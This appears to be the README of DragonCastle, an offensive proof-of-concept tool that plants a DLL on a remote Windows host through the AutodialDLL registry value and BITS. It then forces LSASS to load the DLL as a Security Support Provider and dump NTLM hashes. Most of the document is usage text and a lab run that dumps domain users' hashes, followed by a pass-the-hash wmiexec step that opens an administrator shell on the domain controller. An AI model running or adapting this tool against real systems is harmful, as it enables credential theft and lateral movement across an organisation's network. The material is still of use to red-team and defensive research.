# DragonCastle
A PoC that combines AutodialDLL lateral movement technique and SSP to scrape NTLM hashes from LSASS process.

# Description
Upload a DLL to the target machine. Then it enables remote registry to modify AutodialDLL entry and start/restart BITS service. Svchosts would load our DLL, set again AutodiaDLL to default value and perform a RPC request to force LSASS to load the same DLL as a Security Support Provider.
Once the DLL is loaded by LSASS, it would search inside the process memory to extract NTLM hashes and the key/IV. 

The DLLMain always returns `False` so the processes doesn't keep it.

# Caveats
It only works when `RunAsPPL` is not enabled. Also I only added support to decrypt 3DES because I am lazy, but should be easy peasy to add code for AES. By the same reason, I only implemented support for next Windows versions:

| Build | Support | 
|---|---|
| Windows 10 version 21H2 | 
| Windows 10 version 21H1 | Implemented |
| Windows 10 version 20H2 | Implemented |
| Windows 10 version 20H1 (2004) | Implemented |
| Windows 10 version 1909 | Implemented |
| Windows 10 version 1903 | Implemented |
| Windows 10 version 1809 | Implemented |
| Windows 10 version 1803 | Implemented |
| Windows 10 version 1709 | Implemented |
| Windows 10 version 1703 | Implemented |
| Windows 10 version 1607 | Implemented |
| Windows 10 version 1511 | 
| Windows 10 version 1507 | 
| Windows 8 | 
| Windows 7 | 


The signatures/offsets/structs were taken from Mimikatz. If you want to add a new version just check sekurlsa functionality on Mimikatz.

# Usage
```bash
psyconauta@insulanova:~/Research/dragoncastle|⇒  python3 dragoncastle.py -h                                                                                                                                            
		DragonCastle - @TheXC3LL


usage: dragoncastle.py [-h] [-u USERNAME] [-p PASSWORD] [-d DOMAIN] [-hashes [LMHASH]:NTHASH] [-no-pass] [-k] [-dc-ip ip address] [-target-ip ip address] [-local-dll dll to plant] [-remote-dll dll location]

DragonCastle - A credential dumper (@TheXC3LL)

optional arguments:
  -h, --help            show this help message and exit
  -u USERNAME, --username USERNAME
                        valid username
  -p PASSWORD, --password PASSWORD
                        valid password (if omitted, it will be asked unless -no-pass)
  -d DOMAIN, --domain DOMAIN
                        valid domain name
  -hashes [LMHASH]:NTHASH
                        NT/LM hashes (LM hash can be empty)
  -no-pass              don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line
  -dc-ip ip address     IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter
  -target-ip ip address
                        IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name or Kerberos name and you cannot resolve it
  -local-dll dll to plant
                        DLL location (local) that will be planted on target
  -remote-dll dll location
                        Path used to update AutodialDLL registry value
```

# Example

Windows server on `192.168.56.20` and Domain Controller on `192.168.56.10`:
```bash
psyconauta@insulanova:~/Research/dragoncastle|⇒  python3 dragoncastle.py -u vagrant -p 'vagrant' -d WINTERFELL -target-ip 192.168.56.20 -remote-dll "c:\dump.dll" -local-dll DragonCastle.dll                          
		DragonCastle - @TheXC3LL


[+] Connecting to 192.168.56.20
[+] Uploading DragonCastle.dll to c:\dump.dll
[+] Checking Remote Registry service status...
[+] Service is down!
[+] Starting Remote Registry service...
[+] Connecting to 192.168.56.20
[+] Updating AutodialDLL value
[+] Stopping Remote Registry Service
[+] Checking BITS service status...
[+] Service is down!
[+] Starting BITS service
[+] Downloading creds
[+] Deleting credential file
[+] Parsing creds:

		============
----
User: vagrant
Domain: WINTERFELL
----
User: vagrant
Domain: WINTERFELL
----
User: eddard.stark
Domain: SEVENKINGDOMS
NTLM: d977b98c6c9282c5c478be1d97b237b8
----
User: eddard.stark
Domain: SEVENKINGDOMS
NTLM: d977b98c6c9282c5c478be1d97b237b8
----
User: vagrant
Domain: WINTERFELL
NTLM: e02bc503339d51f71d913c245d35b50b
----
User: DWM-1
Domain: Window Manager
NTLM: 5f4b70b59ca2d9fb8fa1bf98b50f5590
----
User: DWM-1
Domain: Window Manager
NTLM: 5f4b70b59ca2d9fb8fa1bf98b50f5590
----
User: WINTERFELL$
Domain: SEVENKINGDOMS
NTLM: 5f4b70b59ca2d9fb8fa1bf98b50f5590
----
User: UMFD-0
Domain: Font Driver Host
NTLM: 5f4b70b59ca2d9fb8fa1bf98b50f5590
----
User: 
Domain: 
NTLM: 5f4b70b59ca2d9fb8fa1bf98b50f5590
----
User: 
Domain: 

		============
[+] Deleting DLL

[^] Have a nice day!
```

```
psyconauta@insulanova:~/Research/dragoncastle|⇒  wmiexec.py -hashes :d977b98c6c9282c5c478be1d97b237b8 SEVENKINGDOMS/eddard.stark@192.168.56.10          
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
sevenkingdoms\eddard.stark

C:\>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State  
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled

C:\>
```

# Author
Juan Manuel Fernández ([@TheXC3LL](https://twitter.com/TheXC3LL))

# References
 - https://decoded.avast.io/luigicamastra/operation-dragon-castling-apt-group-targeting-betting-companies/
 - https://www.hexacorn.com/blog/2015/01/13/beyond-good-ol-run-key-part-24/
 - https://adepts.of0x.cc/physical-graffiti-lsass/
 - https://blog.xpnsec.com/exploring-mimikatz-part-2/